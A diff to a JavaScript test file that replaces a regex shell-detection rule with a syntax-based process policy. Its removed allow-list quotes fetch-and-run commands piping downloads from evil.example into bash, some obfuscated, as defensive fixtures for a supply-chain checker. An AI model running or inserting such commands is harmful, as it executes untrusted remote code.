@@ -267,166 +267,63 @@ test("every bash lookup inside a fixture finds the checked shell, whatever its P
   assert.equal(existsSync(gone), false, "the private directory is removed at exit");
 });
 
-// Every test file that runs Bash must do it through the preflight module, and the rule is
-// kept simple enough to hold without parsing JavaScript. In every JavaScript and
-// TypeScript file under tests/ (.js .mjs .cjs .jsx .ts .mts .cts .tsx, all directories),
-// except the preflight and this file, no line may:
-// - name a shell at the end of a string literal ("bash", "/bin/sh", [..., "bash"],
-//   "env bash", shell: "/bin/zsh") or as a /bin path anywhere (a `#!/bin/bash` line).
-//   However the call is spelled (spawnSync, an alias, a variable, through `env`), a shell
-//   it starts has to be named somewhere, and this is where;
-// - set a `shell` option or property, or read SHELL;
-// - call exec() or execSync(), which always run their command line with /bin/sh.
-// A line that does one of these for another reason is listed in ALLOWED with that reason,
-// by its exact text, so a changed or new line is looked at again. Comments are held to
-// the same rule. Lines are read as the engine reads them (logicalLines): a backslash line
-// continuation is joined and a string escape is decoded first, so neither hides a name
-// (#576). Decoding was chosen over refusing every escape next to a shell-name character
-// because the escapes have so many spellings (\x, \u, \u{}, octal, a backslash before a
-// plain letter, in a key as well as a value) that a refusal rule would be a second parser
-// with its own gaps, and would flag lines that only mention a name. Other files under
-// tests/ are Python tests and data (.py .json .yaml .yml), which are not read; any other
-// extension, or any file under node_modules, fails (sortTestFiles). What the rule cannot
-// see: a name put together at run time ("ba" + "sh", a variable, a decoded base64 string).
-const SHELL = "(?:ba|z|da|k|c|a|tc|fi)?sh";
-const STARTS_A_SHELL = [
-  ["names a shell at the end of a string literal", new RegExp(`(?<![\\w.])${SHELL}["'\`]`)],
-  ["names a shell by its /bin path", new RegExp(`/bin/${SHELL}\\b`)],
-  ["sets a shell option or reads SHELL", /\bshell["'`]?\]?\s*(?::|=(?!=))|[{,]\s*shell\s*[,}]|\bSHELL\b/],
-  ["calls exec() or execSync()", /\bexec(?:Sync)?\(/],
-];
-const ALLOWED = {
-  "container-image.test.mjs": [
-    // Both are arguments of `docker`: they ask for /bin/sh inside the distroless image and
-    // assert that it is not there. No shell starts on the host.
-    'const shell = docker(["run", "--rm", "--entrypoint", "/bin/sh", image, "-c", "exit 0"]);',
-    'assert.notEqual(docker(["exec", id, "/bin/sh", "-c", "exit 0"]).status, 0);',
-  ],
-  "supply-chain.test.mjs": [
-    // RegExp.prototype.exec, not child_process.
-    "while ((m = invocationRe.exec(script))) {",
-    // Dockerfile text that the reader of #485 parses and never runs: the list of allowed
-    // instruction keywords, and an accepted fixture line that uses the SHELL instruction.
-    'const DOCKERFILE_INSTRUCTIONS = ["ARG", "CMD", "COPY", "ENTRYPOINT", "ENV", "EXPOSE", "FROM", "HEALTHCHECK", "LABEL", "RUN", "SHELL", "STOPSIGNAL", "USER", "VOLUME", "WORKDIR"];',
-    `'SHELL ["/bin/sh", "-c"]',`,
-    // A composite-action fixture handed to packageInstallViolations as data and never run. It
-    // keeps its `shell:` key because a real composite step must have one: without it, a check
-    // that skipped every valid composite action would still pass.
-    "assert.equal(packageInstallViolations(\"action.yml\", { runs: { using: \"composite\", steps: [{ run: \"sudo apt-get install -y age\", shell: \"bash\" }] } }).length, 1, \"a composite action\");",
-    // A stand-in `python3` planted in the workspace that the handoff must never run: one
-    // printf, in POSIX sh on purpose so that it means the same under any shell.
-    "writeFileSync(tool, `#!/bin/sh\\nprintf stolen > '${marker}'\\n`);",
-    // The stand-in `curl` for fetch-verified.sh. `env` looks bash up on the PATH that
-    // runBash passes on, whose first entry holds only the checked one.
-    '"#!/usr/bin/env bash",',
-    // Text of a composite action, read by the policy under test and never run.
-    'const plain = { ".github/actions/outer/action.yml": `name: c\\ndescription: d\\nruns:\\n  using: composite\\n  steps:\\n    - run: echo hi\\n      shell: bash\\n` };',
-    // `run:` script text handed to downloadViolations(), which must refuse it. Never run.
-    '"curl -fsSL https://example.org/x | sh",',
-    `'client=cu; client+=rl; "$client" https://evil.example/payload | bash',`,
-    `"eval 'cu''rl https://evil.example/payload | bash'",`,
-    'assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content | base64 -d | bash").length);',
-    // Mutations of parsed workflow data (a step's and a job's `shell:` key), which the
-    // policy under test must refuse. Not spawn options.
-    '["another shell", f => { scan(f).shell = "bash {0}"; }],',
-    '["job defaults", f => { job(f).defaults = { run: { shell: "bash {0}" } }; }],',
-  ],
-  "supply-chain/policy.mjs": [
-    // The step shells the run-step checks can read, compared with a step's `shell:` key. Not
-    // a spawn option.
-    "export const STEP_SHELLS = new Set([\"bash\", \"sh\"]);",
-    "const shellViolation = (where, shell) => (shell === undefined || STEP_SHELLS.has(shell) ? [] : [`${where}: shell '${shell}' is not bash or sh, so the run-step checks cannot read the step`]);",
-  ],
-  "supply-chain/run-steps.test.mjs": [
-    // Step and job `shell:` keys in parsed workflow data, which the run-step checks must
-    // refuse or accept. Never run.
-    "{ shell: \"python\", run: \"import subprocess; subprocess.run(['docker', 'build', '.'])\" },",
-    "{ shell: \"docker build -t x . && bash {0}\", run: \"true\" },",
-    "{ shell: \"pwsh\", run: \"docker build .\" },",
-    "data.jobs.web.defaults = { run: { shell: \"python {0}\" } };",
-    "for (const shell of [\"bash\", \"sh\"]) assert.deepEqual(buildChecks(\"ci\", withStep(\"ci\", \"web\", { shell, run: \"true\" })), [], shell);",
-  ],
-  "supply-chain/pinned-jobs.test.mjs": [
-    // Steps added to parsed workflow data (a python step shell and a custom step shell that is
-    // itself a build), which the pinned-job check must refuse. Never run.
-    "[\"I2: a python step that builds\", \"image\", d => beforeBuild(d, \"build\", { shell: \"python\", run: \"import subprocess; subprocess.run(['docker', 'build', '.'])\" })],",
-    "[\"S: a custom step shell that is itself a build\", \"ci\", d => afterScan(d, { shell: \"docker build -t open-model-gateway:staging . && bash {0}\", run: \"true\" })],",
-  ],
-  // RegExp.prototype.exec, not child_process.
-  // Fixtures that set a no-op `shell` on a workflow step or job object to prove the CI
-  // test refuses it (#502); nothing is spawned.
-  "ci.test.mjs": [
-    "[\"a no-op shell\", data => { clippy(data).shell = \"true {0}\"; }],",
-    "[\"job-level run defaults\", data => { lint(data).defaults = { run: { shell: \"true {0}\" } }; }],",
-  ],
-  "browser/alert-webhooks.spec.ts": ["const match = /^t=(\\d+),v1=([0-9a-f]{64})$/.exec(signature);"],
-};
-// Source text as the JavaScript engine reads a string, so that no spelling of a name gets
-// past the patterns (#576):
-// - a backslash before a line break continues a string on the next line, so the physical
-//   lines are joined (reported at the first one). A comment that ends in a backslash does
-//   not continue, so each physical line of a joined one is judged on its own as well, and
-//   the joined text only when none of them is caught (`parts`, startsAShell);
-// - \xHH, \uHHHH, \u{H...} and octal escapes stand for the character they name;
-// - a backslash before any other character that has no escape meaning is dropped ("ba\sh"
-//   is "bash"). Quotes, \b \f \n \r \t \v, digits and \\ itself stay as written.
-// Read this way, nothing is refused for being an escape: a line with escapes is judged on
-// what it says. The names are still found only where they stand as text; one built at run
-// time ("ba" + "sh", a variable) is not seen.
-const ESCAPE = /\\(?:(\\)|x([0-9a-fA-F]{2})|u([0-9a-fA-F]{4})|u\{([0-9a-fA-F]+)\}|([0-3][0-7]{0,2}|[4-7][0-7]?)|([^bfnrtv'"`0-9xu\\\n]))/g;
-function unescapeSource(line) {
-  return line.replace(ESCAPE, (escape, backslash, hex, unit, braced, octal, plain) => {
-    if (backslash !== undefined) return escape;
-    if (plain !== undefined) return plain;
-    const code = hex !== undefined ? parseInt(hex, 16) : unit !== undefined ? parseInt(unit, 16) : braced !== undefined ? parseInt(braced, 16) : parseInt(octal, 8);
-    return code <= 0x10ffff ? String.fromCodePoint(code) : escape;
-  });
-}
-function logicalLines(text) {
-  const lines = [];
-  let parts = [];
-  const flush = () => {
-    if (parts.length === 0) return;
-    const raw = parts.map((part, index) => (index < parts.length - 1 ? part.source.slice(0, -1) : part.source)).join("");
-    lines.push({ number: parts[0].number, raw: raw.trim(), text: unescapeSource(raw), parts: parts.length > 1 ? parts.map(({ number, source }) => ({ number, raw: source.trim(), text: unescapeSource(source) })) : [] });
-    parts = [];
-  };
-  text.replace(/\r\n?|[\u2028\u2029]/g, "\n").split("\n").forEach((source, index) => {
-    parts.push({ number: index + 1, source });
-    // An odd number of trailing backslashes: the last one escapes the line break.
-    if (!/(?<!\\)(?:\\\\)*\\$/.test(source)) flush();
-  });
-  flush();
-  return lines;
-}
+// Process authority is checked by syntax, independently of call spelling.
+import { processViolations } from "./process-policy.mjs";
 
-// ALLOWED is a multiset: each listing excuses one occurrence, so a line that appears twice
-// must be listed twice. Appearing more or fewer times than listed fails the rule (#498).
-// An allowed line is matched by its source text: a physical line as written, or, for a
-// line that is caught only once its continuations are joined, the joined text.
-function startsAShell(name, text, allowed = []) {
-  const found = [];
-  const listed = new Map();
-  for (const line of allowed) listed.set(line, (listed.get(line) ?? 0) + 1);
-  const seen = new Map();
-  const judge = ({ number, raw, text: line }) => {
-    const broken = STARTS_A_SHELL.filter(([, pattern]) => pattern.test(line)).map(([what]) => what);
-    if (broken.length === 0) return false;
-    if (listed.has(raw)) seen.set(raw, (seen.get(raw) ?? 0) + 1);
-    else found.push(`${name}:${number} ${broken.join(", ")}: ${raw}`);
-    return true;
-  };
-  for (const line of logicalLines(text)) {
-    if (!line.parts.map(judge).some(Boolean)) judge(line);
+import { promisify } from "node:util";
+import { processArguments, spawnSync as safeSpawnSync, execFile as safeExecFile } from "./process.mjs";
+
+test("the process API validates inert arguments before execution (#597)", () => {
+  for (const file of ["bash", "/bin/sh", "Bash", "rbash", "mksh", "pwsh", "elvish", "env", "busybox", "npm", "npx", "tool.cmd"]) {
+    assert.throws(() => processArguments(file, []), Error, file);
   }
-  const times = n => `${n} ${n === 1 ? "time" : "times"}`;
-  for (const [line, count] of listed) {
-    const appears = seen.get(line) ?? 0;
-    if (appears === 0) found.push(`${name}: an allowed line is gone, remove it from ALLOWED: ${line}`);
-    else if (appears !== count) found.push(`${name}: an allowed line appears ${times(appears)} but is listed ${times(count)}: ${line}`);
+  for (const options of [{ shell: true }, { shell: false }, { shell: "/bin/sh" }, Object.create({ shell: true })]) {
+    assert.throws(() => processArguments("git", [], options), /shell options/);
   }
-  return found;
-}
+  for (const args of [["helper.yaml"], ["helper.py"], ["-e", "inert"], ["--require", "helper.yaml"], ["--eval=inert.mjs"]]) {
+    assert.throws(() => processArguments(process.execPath, args), /JavaScript file/);
+  }
+  const args = ["--version"];
+  assert.deepEqual(processArguments("git", args, { encoding: "utf8" }), ["git", args, { encoding: "utf8", shell: false }]);
+  assert.deepEqual(processArguments("node", ["tests/ci.test.mjs"])[1], ["tests/ci.test.mjs"]);
+  assert.doesNotThrow(() => processArguments("npm", ["run", "build", "--workspace", "@omg/web", "--", "--outDir", "/tmp/inert-output", "--emptyOutDir"]));
+  // Real normal path through the wrapper, without interpreter input or fixtures.
+  const version = safeSpawnSync("git", ["--version"], { encoding: "utf8" });
+  assert.equal(version.status, 0, version.stderr);
+  assert.match(version.stdout, /^git version /);
+});
+
+test("the asynchronous process API preserves Node's promisify contract (#597)", async () => {
+  const result = await promisify(safeExecFile)("git", ["--version"], { encoding: "utf8" });
+  assert.match(result.stdout, /^git version /);
+  assert.equal(result.stderr, "");
+});
+
+test("process imports are refused regardless of their local call spelling (#597)", () => {
+  for (const source of [
+    'import { execSync as run } from "node:child_process"; run("inert");',
+    'import * as cp from "child_process"; cp["execSync"]?.("inert");',
+    'const cp = require("node:child_process");',
+    'const cp = import("node:child_process");',
+    'const cp = import("node:" + "child_process");',
+    'import cp from "node:child_\\x70rocess";',
+    'import cp = require("child_process");',
+    'import { spawnSync } from "node:child_process"; spawnSync /* inert */ ("inert");',
+    'export { spawn } from "node:child_process";',
+    'import { createRequire as load } from "node:module";',
+    'process["binding"]("inert");',
+    'import { checkBash as check } from "./bash-preflight.mjs";',
+    'import * as preflight from "./bash-preflight.mjs";',
+    'const broken = ;',
+  ]) assert.ok(processViolations("fixture.ts", source).length, source);
+  for (const source of [
+    'const fish = "fish"; const re = /#!\\/bin\\/bash/;',
+    'type Options = { shell: string }; const f = (shell: string) => shell;',
+    'const value = ok ? shell : other;',
+    'import { spawnSync } from "./process.mjs";',
+    'const fixture = `import cp from "node:child_process";`;',
+  ]) assert.deepEqual(processViolations("fixture.ts", source), [], source);
+});
 
 // Which files under tests/ the rule reads. `names` are paths below tests/ with "/".
 // - Every JavaScript or TypeScript spelling Node or a bundler loads is read: .js .mjs .cjs
@@ -472,140 +369,10 @@ test("no test file starts bash on its own (#380)", () => {
   assert.deepEqual(sorted.refused, [], "files under tests/ that cannot be scanned");
   const files = sorted.scanned;
   assert.ok(files.includes("supply-chain.test.mjs") && files.includes("oci-tool.test.mjs") && files.includes("browser/stack.mjs") && files.includes("browser/helpers.ts"));
-  assert.deepEqual(Object.keys(ALLOWED).filter(name => !files.includes(name)), [], "ALLOWED names a file that is gone");
-  const users = [];
   for (const name of files) {
     const text = readFileSync(join(root, "tests", name), "utf8");
-    assert.doesNotMatch(text, /\b(?:spawn|spawnSync|exec|execSync|execFile|execFileSync|fork)\(\s*["'`][^"'`\n]*\b(?:ba|z|da|k)?sh["'`]/, `${name} starts a shell directly`);
-    assert.doesNotMatch(text, /\bshell:\s*true\b/, `${name} uses the shell option`);
-    assert.doesNotMatch(text, /\b(?:checkBash|findBash)\b/, `${name} must use bashPath()/runBash(), which take no file`);
-    assert.deepEqual(startsAShell(name, text, ALLOWED[name]), [], `${name} may start a shell that was not checked`);
-    if (/\b(?:runBash|bashPath)\b/.test(text)) users.push(name);
+    assert.deepEqual(processViolations(name, text), [], name);
   }
-  assert.deepEqual(users.sort(), ["oci-tool.test.mjs", "supply-chain.test.mjs", "supply-chain/secret-scan-run.test.mjs", "supply-chain/transfer.test.mjs"]);
-  // The rule itself: each way round the old check is refused, and ordinary lines are not.
-  for (const line of [
-    'spawnSync("env", ["bash", "-c", script]);',
-    "spawnSync('env', ['-S', 'bash']);",
-    'spawnSync("true", [], { shell: "/bin/bash" });',
-    "spawnSync(command, { shell: true });",
-    "const options = { shell };",
-    "options.shell = process.env.SHELL;",
-    'options["shell"] = true;',
-    'const sh = "/bin/bash"; cp.spawnSync(sh, ["-c", script]);',
-    "const sh = `${prefix}/bin/sh`;",
-    'spawnSync("/usr/local/bin/bash", ["x"]);',
-    'spawnSync("zsh");',
-    'symlinkSync("/bin/bash", join(bin, "bash"));',
-    "symlinkSync(bashPath(), join(bin, 'bash'));",
-    "writeFileSync(tool, `#!/bin/bash\\nexit 0\\n`);",
-    'execSync("bash -c true");',
-    "cp.exec(`bash ${file}`);",
-  ]) assert.equal(startsAShell("x.mjs", line).length, 1, line);
-  for (const line of [
-    'runBash(["-c", script], { encoding: "utf8" });',
-    'spawnSync("python3", ["-I", "-"]);',
-    'const FETCH_SCRIPT = ".github/scripts/fetch-verified.sh";',
-    "assert.equal(step.shell, undefined);",
-    "prev.shell === undefined",
-    '`bash ${FETCH_SCRIPT} ${COSIGN_URL}`,',
-    'git(["push", "--force-with-lease"]); await page.getByText("Refresh");',
-    "assert.match(upgrade, /helm\\.sh\\/hook: pre-upgrade\\n/);",
-  ]) assert.deepEqual(startsAShell("x.mjs", line), [], line);
-  assert.equal(startsAShell("x.mjs", "a();", ["b();"]).length, 1, "a stale allowed line is reported");
-});
-
-// An allowed line excuses one occurrence per listing, so a second copy of it (which could
-// feed a real spawn) is not excused by the first one's entry (#498).
-test("an allowed shell line may appear only as often as it is listed (#498)", () => {
-  const line = 'const shell = docker(["run", "--rm", "--entrypoint", "/bin/sh", image]);';
-  assert.equal(startsAShell("x.mjs", line).length, 1, "the line breaks the rule when it is not listed");
-  assert.deepEqual(startsAShell("x.mjs", line, [line]), [], "listed once, appearing once");
-  assert.deepEqual(startsAShell("x.mjs", `${line}\na();\n  ${line}`, [line]), [`x.mjs: an allowed line appears 2 times but is listed 1 time: ${line}`], "listed once, appearing twice");
-  assert.deepEqual(startsAShell("x.mjs", `${line}\n${line}`, [line, line]), [], "listing a line twice allows it twice");
-  assert.deepEqual(startsAShell("x.mjs", `${line}\n${line}\n${line}`, [line, line]), [`x.mjs: an allowed line appears 3 times but is listed 2 times: ${line}`], "listed twice, appearing three times");
-  assert.deepEqual(startsAShell("x.mjs", line, [line, line]), [`x.mjs: an allowed line appears 1 time but is listed 2 times: ${line}`], "listed twice, appearing once");
-  assert.deepEqual(startsAShell("x.mjs", "a();", [line]), [`x.mjs: an allowed line is gone, remove it from ALLOWED: ${line}`], "listed, gone");
-});
-
-// The rule reads source the way the engine does (#576). Each line below really starts a
-// shell, or sets the `shell` option, and passed the rule when it only looked at the
-// characters in the file. They are handed to the scanner as strings: a file holding them
-// would have to be allowlisted, which is the point of the rule.
-test("a shell name hidden by a line continuation or an escape is still found (#576)", () => {
-  for (const [label, source] of [
-    ["a continuation inside the name", 'spawnSync("bas\\\nh", ["-c", script]);'],
-    ["a continuation with CRLF", 'spawnSync("bas\\\r\nh", ["-c", script]);'],
-    ["a continuation with a lone CR", 'spawnSync("bas\\\rh", ["-c", script]);'],
-    ["a continuation with U+2028", 'spawnSync("bas\\\u2028h", ["-c", script]);'],
-    ["a continuation before the closing quote", 'spawnSync("bash\\\n");'],
-    ["a continuation in a template literal", "execFileSync(`bas\\\nh`, []);"],
-    ["a continuation and an escape together", 'spawnSync("b\\\n\\x61sh");'],
-    ["a continuation in a quoted shell option key", 'spawnSync(f, { "she\\\nll": true });'],
-    ["a \\x escape", 'spawnSync("\\x62ash", ["-c", script]);'],
-    ["a \\x escape in the middle", 'spawnSync("ba\\x73h");'],
-    ["a \\u escape", 'spawnSync("ba\\u0073h", ["-c", script]);'],
-    ["a \\u{} escape", 'spawnSync("ba\\u{73}h");'],
-    ["a long \\u{} escape", 'spawnSync("ba\\u{000073}h");'],
-    ["a \\u{} escape with more than eight digits", 'spawnSync("ba\\u{0000000073}h");'],
-    ["an upper-case hex escape", 'spawnSync("\\x62\\x61\\x73\\x68");'],
-    ["an octal escape", 'spawnSync("\\142ash");'],
-    ["an escape in the /bin path", 'spawnSync("/bin/\\x62ash");'],
-    ["an escaped slash in the /bin path", 'spawnSync("env", ["\\/bin\\/sh -c true"]);'],
-    ["a shell option key spelled with \\u", "spawnSync(file, { sh\\u0065ll: true });"],
-    ["a shell option key spelled with \\x", 'spawnSync(file, { "\\x73hell": true });'],
-    ["a shell option set on a variable", 'options["sh\\u{65}ll"] = true;'],
-    ["SHELL spelled with an escape", "const s = process.env.SH\\u0045LL;"],
-    ["execSync spelled with an escape", 'cp.\\u0065xecSync("true");'],
-    ["a backslash before a plain letter", 'spawnSync(file, { "s\\hell": true });'],
-    ["a backslash before most letters", 'spawnSync("b\\a\\s\\h");'],
-    ["env and a hidden shell", "spawnSync('env', ['b\\x61sh']);"],
-    ["a shebang with an escape", '"#!/usr/bin/env b\\u0061sh",'],
-  ]) assert.equal(startsAShell("x.mjs", source).length, 1, `${label}: ${JSON.stringify(source)}`);
-});
-
-test("a continuation is joined and an escape decoded without false findings, and the line is reported where it starts (#576)", () => {
-  const joined = startsAShell("x.mjs", 'a();\nspawnSync("bas\\\nh");\nb();');
-  assert.equal(joined.length, 1);
-  assert.ok(joined[0].startsWith("x.mjs:2 names a shell at the end of a string literal: "), joined[0]);
-  assert.ok(startsAShell("x.mjs", 'a();\nb();\nspawnSync("\\x62ash");')[0].startsWith("x.mjs:3 "));
-  // An escaped backslash before a line break is not a continuation: the next line stands alone.
-  const separate = startsAShell("x.mjs", 'const a = "end\\\\";\nspawnSync("bash");');
-  assert.equal(separate.length, 1);
-  assert.ok(separate[0].startsWith("x.mjs:2 "), separate[0]);
-  // A last line ending in a backslash is still read.
-  assert.equal(startsAShell("x.mjs", 'spawnSync("bash");\\').length, 1);
-  // An allowed line is matched by its source text: the joined lines, escapes as written.
-  const allowedLine = 'const shell = docker(["run", "--entrypoint", "/bin/\\x73h", image]);';
-  assert.equal(startsAShell("x.mjs", allowedLine).length, 1);
-  assert.deepEqual(startsAShell("x.mjs", allowedLine, [allowedLine]), []);
-  assert.deepEqual(startsAShell("x.mjs", 'const path = "/bin/s\\\nh";', ['const path = "/bin/sh";']), [], "caught only when joined: listed as joined");
-  // A comment that ends in a backslash does not continue: the next line is code, and is
-  // judged (and allowed) as the line it is. The rule before #576 saw these too.
-  const comment = startsAShell("x.mjs", '// see C:\\dir\\\nexecSync("true");');
-  assert.equal(comment.length, 1);
-  assert.ok(comment[0].startsWith("x.mjs:2 calls exec() or execSync(): execSync("), comment[0]);
-  assert.equal(startsAShell("x.mjs", 'spawnSync(file, { encoding: "utf8", // note\\\nshell: !0,\n});').length, 1);
-  const listedLine = "while ((m = invocationRe.exec(script))) {";
-  assert.deepEqual(startsAShell("x.mjs", `// see C:\\temp\\\n${listedLine}`, [listedLine]), []);
-  assert.equal(unescapeSource('"\\u{' + "f".repeat(400) + '}"').length, 406, "an escape beyond Unicode stays as written");
-  for (const line of [
-    'const text = "\\x41\\u0042\\u{43}\\104\\n\\t";',
-    'const note = "push\\x20here";',
-    'const word = "\\x70ush";',
-    'const word = "pu\\sh";',
-    'const say = "say \\"bash\\" now";',
-    "const say = 'it\\'s a \\'sh\\' script';",
-    // A literal backslash followed by the text of an escape: the string is `\x62ash`.
-    'const literal = "\\\\x62ash";',
-    'const literal = "\\\\u0073h";',
-    "const re = /\\.mjs$/;",
-    "const re = /\\bpush\\b/;",
-    'const long = "one \\\ntwo";',
-    'const nul = "\\0";',
-    'const big = "\\u{110000}";',
-    'runBash(["-c", "echo \\x68i"]);',
-  ]) assert.deepEqual(startsAShell("x.mjs", line), [], line);
 });
 
 test("every JavaScript and TypeScript spelling is read, other scripts are refused, and so is node_modules (#576)", () => {
